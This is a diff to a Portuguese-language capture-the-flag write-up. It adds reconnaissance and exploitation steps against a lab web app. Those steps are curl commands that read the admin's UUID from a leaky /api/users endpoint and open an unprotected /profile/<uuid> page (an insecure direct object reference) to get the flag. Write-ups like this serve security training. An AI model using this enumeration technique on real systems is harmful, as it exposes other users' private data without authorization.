@@ -43,7 +43,19 @@ Na minha instância o host era esse (HTTP na 80 deu timeout, usei HTTPS).
 
 ### 1. Reconhecimento: a API lista todo mundo
 
-O HTML da home comenta os endpoints. `/api/users` devolve a lista completa, e um dos registros é o admin:
+Antes de tudo, o alvo só responde em HTTPS. Em HTTP puro a conexão expira:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+curl --http1.1 --max-time 15 "http://$TARGET/"
+```
+
+```text
+curl: (28) Connection timed out after 15002 milliseconds
+```
+
+Então sigo tudo em `https://`. O HTML da home comenta os endpoints. `/api/users` devolve a lista completa, e um dos registros é o admin:
 
 ***INSERIR no terminal: Kali (atacante)
 
@@ -73,7 +85,20 @@ A listagem me entrega o UUID do admin. Esse é o identificador do recurso que eu
 
 ### 2. Exploração: abrir o perfil do admin
 
-O meu script de enumeração extrai os UUIDs da home/API e testa as rotas de perfil para cada um. A que importa é a página de perfil do admin. Script completo, idêntico ao arquivo em `scripts/`:
+Com o UUID do admin, faltava achar qual rota renderiza um perfil. O script testa várias variantes por UUID (`/api/users/<id>`, `/api/user/<id>`, `/api/profile/<id>`, `/api/profiles/<id>`) e também a rota de página `/profile/<id>`. As variantes de API deram 404; quem entregou foi a página HTML renderizada:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+curl -sk "https://$TARGET/profile/decad4bf-db81-4cd6-b172-57623bd7d736" | grep -iE 'title|flag'
+```
+
+```text
+<title>Chef Admin &middot; Mise en Place</title>
+...flag{6d37976eeaaXXXXX}...
+```
+
+A página de perfil do admin (`/profile/<uuid>`) não checa quem está pedindo: conhecer o UUID (que a própria `/api/users` vaza) basta para abri-la, e ela carrega a flag. O script automatiza a extração de UUIDs e esse teste. Completo, idêntico ao arquivo em `scripts/`:
 
 > [!NOTE]
 > O `TARGET` está fixo no topo do script (era a minha instância). Troque pela sua antes de rodar.
